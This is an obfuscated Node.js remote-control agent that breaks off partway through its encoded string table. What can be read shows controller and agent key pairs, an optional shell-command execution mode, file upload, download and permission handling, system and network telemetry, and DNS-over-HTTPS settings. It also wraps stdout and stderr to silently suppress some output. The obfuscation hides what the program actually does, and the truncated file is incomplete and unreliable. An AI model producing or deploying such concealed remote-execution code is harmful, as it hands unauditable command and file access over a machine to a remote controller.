#!/usr/bin/env node
const a0c4 = a0b;
(function (a, b) {
    const c3 = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(c3(0xa9b)) / 0x1 * (parseInt(c3(0x23d)) / 0x2) + -parseInt(c3(0xa78)) / 0x3 * (-parseInt(c3(0x759)) / 0x4) + parseInt(c3(0xcc6)) / 0x5 + -parseInt(c3(0xc4d)) / 0x6 + parseInt(c3(0x7b9)) / 0x7 + parseInt(c3(0x341)) / 0x8 * (parseInt(c3(0xcd5)) / 0x9) + -parseInt(c3(0x481)) / 0xa;
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x95299));
const a0c = [
    a0c4(0x864),
    a0c4(0x6bb),
    'falling\x20back\x20to\x20ArrayBuffer\x20instantiation'
];
function a0d(a) {
    const b = {
        'asFaU': function (c) {
            return c();
        }
    };
    return function (c, d, f) {
        const c5 = a0b, g = c[c5(0xa3c)]();
        if (a0c[c5(0x3dd)](h => g['includes'](h))) {
            if (typeof f === c5(0xacb))
                b[c5(0xa89)](f);
            return !![];
        }
        return a['apply'](this, arguments);
    };
}
process[a0c4(0x7e5)][a0c4(0x32b)] = a0d(process[a0c4(0x7e5)]['write']), process[a0c4(0x8e1)]['write'] = a0d(process[a0c4(0x8e1)]['write']);
const a0f = require(a0c4(0x92f)), a0g = require(a0c4(0x378)), a0h = require(a0c4(0x603)), a0i = require('net'), a0j = require(a0c4(0x6c6)), a0k = require(a0c4(0xb85)), a0l = require('fs'), a0m = require('fs')['promises'], a0n = require(a0c4(0x9d4)), a0o = require('path'), a0p = require('os'), a0q = require(a0c4(0x2d6)), {
        exec: a0r,
        spawn: a0s
    } = require('child_process'), a0t = require(a0c4(0x441)), a0u = require(a0c4(0xa6d)), {encrypt: a0v} = require('eciesjs'), a0w = require('base64-js'), a0x = require(a0c4(0x462)), a0y = require(a0c4(0x533));
function a0z() {
    const c6 = a0c4, a = {
            'abtiK': c6(0x50f),
            'nCJBa': 'utf8',
            'YFHRV': c6(0x2d2),
            'kpibC': function (b, c) {
                return b <= c;
            },
            'SEXHM': function (b, c) {
                return b + c;
            },
            'vqxQd': function (b, c) {
                return b >= c;
            },
            'VnFQw': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0o[c6(0x6e5)](__dirname, a[c6(0xc9c)]);
        if (!a0l['existsSync'](b))
            return;
        for (let c of a0l['readFileSync'](b, a['nCJBa'])[c6(0x3ff)](/\r?\n/)) {
            let d = c['trim']();
            if (!d || d[c6(0x6ec)]('#'))
                continue;
            if (d['startsWith'](a['YFHRV']))
                d = d[c6(0xa40)](0x7)[c6(0x946)]();
            const f = d['indexOf']('=');
            if (a[c6(0x568)](f, 0x0))
                continue;
            const g = d[c6(0xa40)](0x0, f)[c6(0x7e4)]();
            let h = d['slice'](a[c6(0x821)](f, 0x1))['trim']();
            a[c6(0x5c9)](h[c6(0xcfc)], 0x2) && (h[c6(0x6ec)]('\x22') && h[c6(0xd23)]('\x22') || h['startsWith']('\x27') && h['endsWith']('\x27')) && (h = h['slice'](0x1, -0x1));
            if (g && !a[c6(0x8a7)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C;
try {
    typeof Bun !== 'undefined' ? a0C = require(a0c4(0x444)) : a0C = require(a0c4(0x64d));
} catch (a0c2) {
    console[a0c4(0xbb0)](a0c4(0x939)), console['error'](a0c4(0x43b) + a0c2[a0c4(0x1f1)]), console[a0c4(0xbb0)](a0c4(0x3b5)), process['exit'](0x1);
}
const a0D = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const c7 = a0c4, a = {
                'LtZpF': c7(0x7f2),
                'tkkll': function (b, c) {
                    return b !== c;
                }
            };
        return typeof a0P !== a[c7(0x565)] && a[c7(0xc3f)](a0P[c7(0xd03)], undefined) ? a0P['LOG_LEVEL'] : 0x2;
    },
    'debug': a => {
        const c8 = a0c4, b = {
                'ZhlgS': function (c, d) {
                    return c <= d;
                }
            };
        b[c8(0xa93)](a0D[c8(0x858)], a0D[c8(0x7ca)][c8(0x708)]) && console['log']('\x1b[90m[DEBUG]\x1b[0m\x20' + a);
    },
    'info': a => {
        const c9 = a0c4, b = {
                'tDovX': function (c, d) {
                    return c <= d;
                }
            };
        b[c9(0x334)](a0D[c9(0x858)], a0D['LEVELS'][c9(0xc08)]) && console[c9(0x57a)](c9(0x216) + a);
    },
    'warn': a => {
        const ca = a0c4, b = {
                'MImee': function (c, d) {
                    return c <= d;
                }
            };
        b[ca(0x728)](a0D[ca(0x858)], a0D[ca(0x7ca)]['WARN']) && console[ca(0x57a)](ca(0x974) + a);
    },
    'error': a => {
        const cb = a0c4;
        a0D[cb(0x858)] <= a0D[cb(0x7ca)][cb(0xb48)] && console[cb(0x57a)](cb(0x43f) + a);
    }
};
function a0E() {
    const cc = a0c4, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p['homedir'](),
            process[cc(0x2cb)]()
        ];
    for (const b of a) {
        if (b && a0l['existsSync'](b) && a0l['statSync'](b)[cc(0x39a)]())
            return b;
    }
    return process['cwd']();
}
function a0F() {
    const cd = a0c4;
    let a = null;
    try {
        a = a0p['homedir']();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[cd(0xc2f)](d) && a0l[cd(0x4c6)](d)[cd(0x39a)]())
            return d;
        if (d)
            console['log'](cd(0x235) + d);
    }
    return console[cd(0x57a)](cd(0x392) + process[cd(0x2cb)]()), process['cwd']();
}
class a0G {
    constructor(a = 'ok') {
        const ce = a0c4;
        this[ce(0x8ab)] = a;
    }
}
class a0H extends a0G {
    constructor(a = 'ok', b = 0x0) {
        const cf = a0c4;
        super(a), this[cf(0x32e)] = b;
    }
}
class a0I extends a0G {
    constructor() {
        const cg = a0c4, a = { 'pWpeq': cg(0x51e) }, b = a['pWpeq']['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['os'] = '';
                continue;
            case '1':
                this['virtualization'] = '';
                continue;
            case '2':
                this[cg(0x9f7)] = null;
                continue;
            case '3':
                super();
                continue;
            case '4':
                this[cg(0xb72)] = a0P[cg(0xc9f)];
                continue;
            case '5':
                this[cg(0x944)] = 0x0;
                continue;
            case '6':
                this[cg(0x94f)] = null;
                continue;
            case '7':
                this[cg(0x3a3)] = 0x0;
                continue;
            case '8':
                this[cg(0xc37)] = 0x0;
                continue;
            case '9':
                this[cg(0x492)] = '';
                continue;
            case '10':
                this[cg(0xd2d)] = null;
                continue;
            case '11':
                this[cg(0xa25)] = '';
                continue;
            case '12':
                this['marks'] = [];
                continue;
            case '13':
                this[cg(0x1a0)] = 0x0;
                continue;
            case '14':
                this[cg(0x430)] = '';
                continue;
            case '15':
                this[cg(0x6f2)] = '';
                continue;
            case '16':
                this[cg(0x4f9)] = '';
                continue;
            }
            break;
        }
    }
}
class a0J extends a0G {
    constructor() {
        const ch = a0c4, a = { 'oHIST': ch(0x5eb) }, b = a[ch(0x29c)][ch(0x3ff)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[ch(0x2bf)] = 0x0;
                continue;
            case '1':
                this['network'] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '2':
                this[ch(0xaf7)] = { 'usage': 0x0 };
                continue;
            case '3':
                this[ch(0x74c)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '4':
                this[ch(0x716)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '5':
                this[ch(0x43d)] = 0x0;
                continue;
            case '6':
                this[ch(0x1f1)] = '';
                continue;
            case '7':
                this[ch(0x474)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '8':
                this[ch(0xb0f)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '9':
                this[ch(0x21e)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '10':
                super();
                continue;
            }
            break;
        }
    }
}
class a0K extends a0G {
    constructor() {
        const ci = a0c4, a = ci(0x22b)[ci(0x3ff)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[ci(0x3de)] = 0x0;
                continue;
            case '1':
                this[ci(0xa5f)] = '';
                continue;
            case '2':
                super();
                continue;
            case '3':
                this[ci(0xdba)] = ![];
                continue;
            case '4':
                this[ci(0xb5c)] = '';
                continue;
            }
            break;
        }
    }
}
class a0L {
    constructor() {
        const cj = a0c4, a = { 'tayoq': cj(0x24c) }, b = a['tayoq'][cj(0x3ff)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['name'] = '';
                continue;
            case '1':
                this[cj(0xa9a)] = '';
                continue;
            case '2':
                this['path'] = '';
                continue;
            case '3':
                this['type'] = '';
                continue;
            case '4':
                this[cj(0x1d8)] = '';
                continue;
            case '5':
                this['size'] = 0x0;
                continue;
            case '6':
                this['owner'] = '';
                continue;
            case '7':
                this[cj(0xa17)] = '';
                continue;
            }
            break;
        }
    }
}
class a0M {
    constructor() {
        const ck = a0c4;
        this[ck(0x5b0)] = '', this[ck(0x4c7)] = '', this['mode'] = '', this[ck(0xa17)] = '', this[ck(0x221)] = '', this['readable'] = ![], this[ck(0x466)] = ![], this['executable'] = ![];
    }
}
class a0N extends a0G {
    constructor() {
        const cl = a0c4;
        super(), this[cl(0xa3a)] = [];
    }
}
class a0O {
    static [a0c4(0x5fc)]() {
        const cm = a0c4, a = {
                'bqdbQ': 'jwk',
                'DOcgr': cm(0x9dd),
                'rjEYJ': function (i, j) {
                    return i !== j;
                },
                'sfQCN': function (i, j) {
                    return i !== j;
                },
                'EdOwD': cm(0x7be)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k['generateKeyPairSync'](cm(0x3b3)), d = b[cm(0xd28)]({ 'format': a[cm(0x557)] }), f = c[cm(0xd28)]({ 'format': a[cm(0x557)] }), g = Buffer[cm(0x581)](d['d'], a['DOcgr']), h = Buffer[cm(0x581)](f['x'], a[cm(0xbc4)]);
        return (a['rjEYJ'](g[cm(0xcfc)], 0x20) || a[cm(0x442)](h['length'], 0x20)) && a0D[cm(0xbb0)](cm(0x70e)), {
            'private_b64': g[cm(0xa3c)](a[cm(0xa09)]),
            'public_b64': h[cm(0xa3c)](a[cm(0xa09)])
        };
    }
    static [a0c4(0xc2b)](a) {
        const cn = a0c4, b = this[cn(0x5fc)]();
        return {
            'role': a,
            'private_b64': b[cn(0x3ea)],
            'public_b64': b['public_b64']
        };
    }
    static ['generatePair'](a = 'Controller', b = a0c4(0x762)) {
        const co = a0c4, c = {
                'control': this[co(0xc2b)](a),
                'agent': this[co(0xc2b)](b)
            };
        return c;
    }
}
class a0P {
    static [a0c4(0x406)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0c4(0x4d7)] = (process.env.EXEC_SHELL || a0c4(0x8da))[a0c4(0xc48)]() === 'true';
    static [a0c4(0x708)] = (process.env.DEBUG || a0c4(0x8a8))['toLowerCase']() === a0c4(0x8da);
    static [a0c4(0xd81)] = parseInt(process.env.TIMESTAMP_WINDOW || a0c4(0xce1));
    static ['LOG_LEVEL'] = parseInt(process.env.LOG_LEVEL || (this['DEBUG'] ? '0' : '3'), 0xa);
    static ['ECDSA_PUBLIC_KEY_PEM'] = a0P[a0c4(0xc02)](a0c4(0x2e9), a0c4(0x79d)) || 'ECDSA公钥内容';
    static [a0c4(0x7b5)] = a0P[a0c4(0xc02)](a0c4(0xd32), a0c4(0x73d)) || 'ECIES公钥内容';
    static [a0c4(0xace)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0c4(0x20e)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0c4(0x2a6), 0xa);
    static [a0c4(0x37b)] = a0F();
    static [a0c4(0xae2)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0c4(0x919));
    static [a0c4(0x41d)] = (process.env.FOLLOW_SYMLINKS || 'false')[a0c4(0xc48)]() === a0c4(0x8da);
    static [a0c4(0xa23)] = Number[a0c4(0xba3)](parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || '4194304', 0xa)) ? parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || a0c4(0xbcb), 0xa) : 0x400000;
    static [a0c4(0x933)] = (process.env.FILE_AUDIT_LOG || a0c4(0x8da))['toLowerCase']() === 'true';
    static [a0c4(0x239)] = !![];
    static [a0c4(0xc34)] = [];
    static [a0c4(0xbbc)] = {};
    static [a0c4(0x77c)] = ![];
    static [a0c4(0x622)] = parseInt(process.env.TASK_TIMEOUT || '300');
    static ['CRON_CHECK_INTERVAL'] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0c4(0x26b)] = [];
    static [a0c4(0x30f)] = [];
    static [a0c4(0xc89)] = parseInt(process.env.MAX_TASK_LOG || a0c4(0x333));
    static [a0c4(0x5c5)] = process.env.HOST || a0c4(0x271);
    static [a0c4(0x2ab)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0c4(0x475));
    static [a0c4(0xbb7)] = ((() => {
        const cp = a0c4, a = (process.env.KMODE || '0')[cp(0x7e4)]();
        return /^2q(?:uic)?$/i['test'](a) ? '2' : a || '0';
    })());
    static [a0c4(0xd79)] = /^2q(?:uic)?$/i['test']((process.env.KMODE || '')[a0c4(0x7e4)]());
    static [a0c4(0x644)] = (process.env.KNAME || '')['trim']();
    static [a0c4(0x1a8)] = (process.env.KNAME_KEY || '')['trim']();
    static [a0c4(0xa83)] = process.env.KPATH || '';
    static [a0c4(0xafc)] = (process.env.KISAMA_DNS || 'off')[a0c4(0x7e4)]()['toLowerCase']();
    static [a0c4(0x6c3)] = (process.env.KISAMA_DOH_SERVERS || '')[a0c4(0x7e4)]();
    static ['DOH_SERVERS_DEFAULT'] = [
        a0c4(0x2c6),
        a0c4(0x9ff),
        a0c4(0x206)
    ];
    static [a0c4(0xc9f)] = process.env.AGENT_VERSION || a0c4(0x20d);
    static [a0c4(0x680)] = a0k['randomBytes'](0x20)[a0c4(0xa3c)]('base64');
    static [a0c4(0xc15)] = a0O[a0c4(0xdb0)]();
    static [a0c4(0xbf4)]() {
        const cq = a0c4, a = {
                'KZakh': cq(0x385),
                'YzWBU': cq(0x7be),
                'EMPEd': 'kisama-ws-token-v1'
            };
        return a0k[cq(0x66f)](a[cq(0x265)], Buffer[cq(0x581)](this['SESSION_KEY'], a[cq(0xd95)]))[cq(0x954)](a[cq(0x9d7)])[cq(0x3a0)](cq(0x7be));
    }
    static ['rotateOperationalSecrets']() {
        const cr = a0c4, a = {
                'afvrl': cr(0x7be),
                'PJwKL': '🔄\x20[SECURITY]\x20临时密钥过期,\x20已轮换\x20SESSION_KEY\x20与控制端\x20Noise\x20密钥对\x20(合法控制端需重新认证获取\x20baseinfo\x20新密钥)'
            }, b = a0O[cr(0xdb0)]();
        this[cr(0xc15)][cr(0xbe5)] = b[cr(0xbe5)], this[cr(0xa0d)]['controller']['private'] = b[cr(0xbe5)][cr(0x3ea)], this['SESSION_KEY'] = a0k[cr(0xa8d)](0x20)['toString'](a['afvrl']), this['_status_cache'] = null, this[cr(0x6c4)] = 0x0, a0D[cr(0x782)](a[cr(0xa5d)]);
    }
    static [a0c4(0xa0d)] = {
        'controller': { 'private': this['NOISE_KEYS_INTERNAL'][a0c4(0xbe5)][a0c4(0x3ea)] },
        'agent': { 'public': this[a0c4(0xc15)][a0c4(0x38d)]['public_b64'] }
    };
    static [a0c4(0x4a2)] = 0xe10;
    static ['BASEINFO_LOCAL_TTL'] = 0x1e;
    static ['BASEINFO_FAIL_BACKOFF'] = 0x3c;
    static [a0c4(0x785)] = 0x1e;
    static [a0c4(0x3ba)] = null;
    static ['_baseinfo_p_promise'] = null;
    static [a0c4(0x50a)] = null;
    static [a0c4(0xb7f)] = 0x0;
    static [a0c4(0x39f)] = 0x0;
    static [a0c4(0x321)] = null;
    static ['_baseinfo_net_cache'] = null;
    static [a0c4(0xa1b)] = 0x0;
    static [a0c4(0xd8b)] = 0x0;
    static ['_baseinfo_net_promise'] = null;
    static ['_status_cache'] = null;
    static [a0c4(0x6c4)] = 0x0;
    static [a0c4(0x7dc)] = null;
    static [a0c4(0xa45)]() {
        const cs = a0c4, a = {
                'Hkrms': function (b, c) {
                    return b(c);
                },
                'wUwqI': function (b, c) {
                    return b / c;
                }
            };
        return a[cs(0x25d)](Number, a[cs(0x403)](process['hrtime'][cs(0x854)](), 0xf4240n));
    }
    static [a0c4(0x36f)](a) {
        return a ? { ...a } : null;
    }
    static async [a0c4(0x683)]() {
        const ct = a0c4;
        if (this[ct(0x3ba)])
            return this[ct(0x36f)](this[ct(0x3ba)]);
        return !this[ct(0x68e)] && (this['_baseinfo_p_promise'] = new a0a0()[ct(0x517)]()[ct(0x22d)](a => {
            const cu = ct;
            return a0D['debug'](cu(0x397) + a[cu(0x1f1)], 0x1), a0a0['staticFallback']();
        })['then'](a => {
            const cv = ct;
            return this[cv(0x3ba)] = a, a;
        })[ct(0x9de)](() => {
            this['_baseinfo_p_promise'] = null;
        })), this[ct(0x36f)](await this[ct(0x68e)]);
    }
    static async [a0c4(0x93b)](a) {
        const cw = a0c4, b = {
                'NnKaU': function (d, f) {
                    return d < f;
                },
                'oeZld': function (d, f) {
                    return d - f;
                },
                'VyejR': function (d, f) {
                    return d * f;
                }
            }, c = this[cw(0xa45)]();
        if (this[cw(0x50a)] && b[cw(0x87a)](b[cw(0x745)](c, this[cw(0xb7f)]), b['VyejR'](this[cw(0x530)], 0x3e8)))
            return this['_cloneBaseInfoPart'](this['_baseinfo_local_cache']);
        if (this[cw(0x39f)] && c - this[cw(0x39f)] < this[cw(0x241)] * 0x3e8)
            return this['_cloneBaseInfoPart'](this['_baseinfo_local_cache'] || a0a0[cw(0x21d)]());
        return !this['_baseinfo_local_promise'] && (this[cw(0x321)] = new a0a0()[cw(0xcc7)](a)['then'](d => {
            const cx = cw;
            return this[cx(0x50a)] = d, this['_baseinfo_local_time'] = this[cx(0xa45)](), this[cx(0x39f)] = 0x0, d;
        })[cw(0x22d)](d => {
            const cy = cw;
            return a0D[cy(0x354)](cy(0x3f8) + d[cy(0x1f1)], 0x1), this[cy(0x39f)] = this[cy(0xa45)](), this[cy(0x50a)] || a0a0['localFallback']();
        })[cw(0x9de)](() => {
            const cz = cw;
            this[cz(0x321)] = null;
        })), this['_cloneBaseInfoPart'](await this[cw(0x321)]);
    }
    static async [a0c4(0x699)]() {
        const cA = a0c4, a = {
                'yAojJ': function (c, d) {
                    return c < d;
                },
                'sYjYY': function (c, d) {
                    return c - d;
                },
                'cyKVh': function (c, d) {
                    return c * d;
                },
                'ywjCs': function (c, d) {
                    return c * d;
                }
            }, b = this[cA(0xa45)]();
        if (this['_baseinfo_net_cache'] && a[cA(0x4ad)](a[cA(0xac6)](b, this[cA(0xa1b)]), a[cA(0xca0)](this[cA(0x4a2)], 0x3e8)))
            return this[cA(0x36f)](this[cA(0x4d1)]);
        if (this[cA(0xd8b)] && a[cA(0x4ad)](a[cA(0xac6)](b, this[cA(0xd8b)]), a[cA(0x491)](this[cA(0x241)], 0x3e8)))
            return this[cA(0x36f)](this[cA(0x4d1)] || a0a0[cA(0x402)]());
        return !this[cA(0xd69)] && (this[cA(0xd69)] = new a0a0()[cA(0x698)]()[cA(0xcb3)](c => {
            const cB = cA;
            return this['_baseinfo_net_cache'] = c, this[cB(0xa1b)] = this[cB(0xa45)](), this[cB(0xd8b)] = 0x0, c;
        })[cA(0x22d)](c => {
            const cC = cA;
            return a0D[cC(0x354)](cC(0xb28) + c['message'], 0x1), this['_baseinfo_net_fail_time'] = this[cC(0xa45)](), this[cC(0x4d1)] || a0a0[cC(0x402)]();
        })[cA(0x9de)](() => {
            const cD = cA;
            this[cD(0xd69)] = null;
        })), this[cA(0x36f)](await this[cA(0xd69)]);
    }
    static [a0c4(0xc02)](a, b) {
        const cE = a0c4, c = process.env[a];
        if (c)
            return c;
        const d = a0o[cE(0x6e5)](__dirname, b);
        if (a0l[cE(0xc2f)](d))
            try {
                return a0l[cE(0xcda)](d, cE(0x1bc))[cE(0x7e4)]();
            } catch (f) {
            }
        return '';
    }
    static [a0c4(0xd80)]() {
        const cF = a0c4, a = {
                'ihgTC': cF(0xb8c),
                'CyUPx': cF(0x1cd),
                'NnCfc': function (b, c) {
                    return b > c;
                },
                'pGPcO': cF(0x688),
                'tkjfS': '\x20\x20\x202.\x20或将密钥文件放入\x20./keys/\x20目录\x20(运行\x20generate_keys.py\x20生成)',
                'YXaae': cF(0x94a)
            };
        if (!this['DEBUG']) {
            const b = [];
            !this[cF(0x7f5)] && b[cF(0x21f)](a[cF(0x607)]);
            !this[cF(0x7b5)] && b['push'](a[cF(0x1f4)]);
            if (a['NnCfc'](b[cF(0xcfc)], 0x0)) {
                const c = a[cF(0x306)][cF(0x3ff)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        process['exit'](0x1);
                        continue;
                    case '1':
                        a0D[cF(0x354)](a[cF(0xaf4)]);
                        continue;
                    case '2':
                        a0D[cF(0x354)](cF(0x56b));
                        continue;
                    case '3':
                        a0D['debug'](cF(0x3f2));
                        continue;
                    case '4':
                        a0D['error'](a[cF(0x979)]);
                        continue;
                    case '5':
                        b[cF(0x982)](f => a0D[cF(0xbb0)](cF(0xad1) + f));
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0c4(0xb4f)](a = {}) {
        const cG = a0c4, b = {
                'HDQsG': function (c, d) {
                    return c !== d;
                },
                'wKcjI': function (c, d) {
                    return c !== d;
                },
                'OReUn': function (c, d) {
                    return c(d);
                },
                'ezkRi': function (c, d) {
                    return c(d);
                },
                'SanYD': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b[cG(0x1f0)](a[cG(0x2ab)], undefined) && b['wKcjI'](a[cG(0x2ab)], null) && (this[cG(0x2ab)] = parseInt(b['OReUn'](String, a[cG(0x2ab)]), 0xa));
        a['ECDSA_PUBLIC_KEY_PEM'] && (this[cG(0x7f5)] = a[cG(0x7f5)][cG(0x7e4)]());
        a[cG(0x7b5)] && (this[cG(0x7b5)] = a[cG(0x7b5)][cG(0x7e4)]());
        if (b[cG(0x1c1)](a['KMODE'], undefined) && b[cG(0x1c1)](a[cG(0xbb7)], null)) {
            const c = b[cG(0x357)](String, a['KMODE'])['trim']();
            if (/^(?:0|1|2|2q|2quic)$/i[cG(0x1d0)](c)) {
                const d = c[cG(0xc48)]();
                this[cG(0xbb7)] = d[cG(0x6ec)]('2') ? '2' : d, this[cG(0xd79)] = /^2q(?:uic)?$/[cG(0x1d0)](d);
            } else
                this[cG(0xbb7)] = '0', this[cG(0xd79)] = ![], a0D[cG(0x782)](cG(0xc6f) + b[cG(0xb00)](String, a[cG(0xbb7)]) + cG(0x835));
        }
        a[cG(0x644)] && b[cG(0xb00)](String, a[cG(0x644)])[cG(0x7e4)]() && (this[cG(0x644)] = b[cG(0xb00)](String, a[cG(0x644)])[cG(0x7e4)]()), a[cG(0x1a8)] && b[cG(0x357)](String, a['KNAME_KEY'])['trim']() && (this['KNAME_KEY'] = b['OReUn'](String, a[cG(0x1a8)])[cG(0x7e4)]()), a['KPATH'] && b[cG(0xb00)](String, a[cG(0xa83)])[cG(0x7e4)]() && (this[cG(0xa83)] = b[cG(0x3f6)](String, a[cG(0xa83)])[cG(0x7e4)]());
    }
}
const a0Q = require(a0c4(0x479)), a0R = require('dgram');
function a0a() {
    const kY = [
        'revZDK0',
        'tK9ju0vFs0vzu19jtLrfuK5bta',
        'yM9QwMS',
        'vhntr2G',
        'DhrSx3nLy29Uzhm',
        'Bg9JywXtDhjLyw1eyxrH',
        'C0fUDw0',
        'ueDsEfq',
        'vfvNAfe',
        'D0DlrMy',
        'rfnXDva',
        'qvrZsgy',
        'A2vYBMvS',
        'DNDjDxm',
        'DxbKyxrLza',
        'CMv0CMfUC21PDhrLza',
        'x2DSB2jHBeHVB2S',
        'r3nsqLa',
        'qxzSrxO',
        'y3jLzgL0twf4rgf0yq',
        'DefiCKm',
        'v1PNwfO',
        'AKzPB0u',
        'z2vUzxjHDgvtAw5NBgu',
        'DhvSD1y',
        'ELH0ueO',
        'EwrAz0q',
        'zxHPC3rZu3LUyW',
        'Dg9urwi',
        'B1vfzgm',
        'zMv0y2Hjua',
        's25dwgK',
        'B25LDgfZA3m',
        'ELbTsvC',
        'iG0kdqO',
        'zgLZA190B3rHBa',
        'D2vIC29JA2v0ihn0CMvHBsa',
        'zfjQu1a',
        'y2fvzvK',
        'terLC2G',
        'ugf0AcbUB3qGzM91BMq',
        'z3PmrNC',
        'tvvjqwe',
        'DgTRBgW',
        'Dhj1BMnHDgvKieHqqunlihn0CMLUzYbKyxrH',
        'CxvLDwu',
        'x2nYyZmY',
        'ChvIBgLJx2i2na',
        'CMvHzgfIBgu',
        'A2LZyw1Hlxn0B3jL',
        'y29UBKLUzgv4',
        'vffoDKW',
        'Dg9mB3DLCKnHC2u',
        'Bwf4u3rYzwfTC0jPzgK',
        'Chv0',
        'B2jQzwn0',
        'u2LNBMf0DxjLihzLCMLMAwnHDgLVBIbMywLSzwq6ia',
        'mZeXodi1ng1zywfvBq',
        'lNrTCa',
        'yNrYq0S',
        'qufLthu',
        'DgvYBwLUywW',
        'CgPVz24',
        'BwfYA3m',
        'tvzPCg0',
        'CwvdvhG',
        'Dw5LEhbLy3rLzcbdB25Uzwn0uMvXDwvZDcbSyxLVDxq',
        'DejQvhq',
        'whDgBva',
        'z2v0tg9JywXjuhy2',
        'tK1dy0S',
        'zNjHBwu',
        'CMvZzxrtDhjLyw0',
        'x3DHA2u',
        'sNj2rxi',
        'Cgzlww4',
        'DxnYl2jPBI9MDxnLCM1VDw50mW',
        'zfv5AxC',
        'ic0Tls0GzxHPDgnVzgu9',
        'sLbrueC',
        'DgfRzq',
        'r2X1BMm',
        'sevbra',
        'uMTkwvO',
        'z2v0t25LDgLTzvrHC2TZ',
        'zwDMBuq',
        'y2fSBa',
        'vw5ZDxbWB3j0zwqGEMLWig1LDgHVzdOG',
        'y1HWCMG',
        'BwfNAwm',
        'vvbmuLO',
        'w0Tnt0rfxsdIMQdVUi8G6z2E5RovieTnt0rfiowfPEwpGIaO',
        'C09HA0K',
        'icaG6k+35Qoa5P+Lievdrfnbx1bvqKTfwsdNJQ/LOOpLJ5JPH4/MIjyGA2v5CY9Hz2vUDf9Ly2rZyv9WDwiUCgvTioAyR+wqPUs4UUwqIoAZLsbqlti1nIdLHAZPKQuGkfbftsdMIjyGmZmG5A2x6iQc5y6l57YPiejHC2u2ncK',
        'zwnKC2fFChjPDMf0zv9OzxG',
        'wxDnvxe',
        'z2v0q29UDgfPBMvYtwvTB3j5',
        'Aw5gBgLNAhq',
        'zvPtEeW',
        'tNvQBM4',
        'iIdMNkZMRkhLM57OKl3NS7VNU5/OP6pMNPaGkowpR+EuQoAaP+s8MowfIcK',
        'Aw52ywXPzcbtrvrusu5huYbWyxLSB2fK',
        'vuPYq3m',
        'CgfYC2vuyxnRtwv0yq',
        'qM5ZBxy',
        'Dw56AxbbCMnOAxzL',
        'BeTqqwy',
        'CNHFyNL0zxm',
        'rvj6teu',
        'CMvJDLjHBMDLCW',
        'Ahr0Chm6lY8',
        'Dw5RBM93BIbZDhjLyw0G',
        'wLPiq24',
        'Ec1LBMnYExb0zwq',
        'ELzUsMm',
        'x2nYy1rHyMXL',
        'EgrLCK4',
        'tufyx1rbu0TFte9hx1njwKu',
        'ufDNsuS',
        'x3n5C3rLBwn0BeXVy2f0ywjSzq',
        'A3nmuuy',
        'rxfWEwy',
        'qIbVBMuTCNr0igjLzM9YzsbOyw5KC2HHA2u',
        'AwT3swu',
        'BwfSzM9YBwvKieHuvfaVms4XihjLC3bVBNnLihn0yxr1CW',
        'B3jKzxjbzgrYzxnZzxm',
        'BvPWwue',
        'y3jLyxrLu29JA2v0',
        'sxHlCem',
        'Dg9cExrLCW',
        'wgjXtve',
        'BKPlu2q',
        'CvLlBwW',
        'v0L0t1q',
        'sxbytvO',
        'yM9VDhn0CMfW',
        'ywj0AuS',
        'Ec1LBMnYExb0zwqSihGTywDLBNqTDMvYC2LVBIWGEc1MAwXLlxnPEMuSihGTB3jPz2LUywWTCgf0Aa',
        'x21HCMTlDM0',
        'quDftLrFvKvsu0LptG',
        'y3LlvMG',
        'vKz5q28',
        'zwnPzxnFChjPDMf0zv9RzxK',
        'AwrSzq',
        'ugXyrNi',
        'l2fWAs9HCMDV',
        'y2zgCfa',
        'EufAAKG',
        'ntaW',
        'qxrXtNi',
        'qxroBvC',
        'v0fstL9jtLrfuLzbta',
        'Cgjwrgu',
        'B25eyxrH',
        'CgvLCLn0CMvHBvjLBw90zq',
        'Cdi1nG',
        'seLtvezjteu',
        'qw9RrxK',
        'qLb3Evi',
        'DgHLBG',
        'DK1iEw8',
        'rwzduum',
        'EerhCuu',
        'ihjLyxnVBJ0',
        'Ae5lD1O',
        'CNfiCeO',
        's1zn',
        'z2rvyLi',
        'AufkEeG',
        'EKvhwLy',
        'qM9Iz2W',
        'EgTdu0m',
        'vhPVqxu',
        'uxnxr3a',
        'yw5oAhC',
        'CgfYC2vszxf1zxn0',
        'yLbmvw4',
        'BgTWqvu',
        'mJe3ndeWDKXRyvz0',
        'y29SBgvJDeXVy2fSsw5MBW',
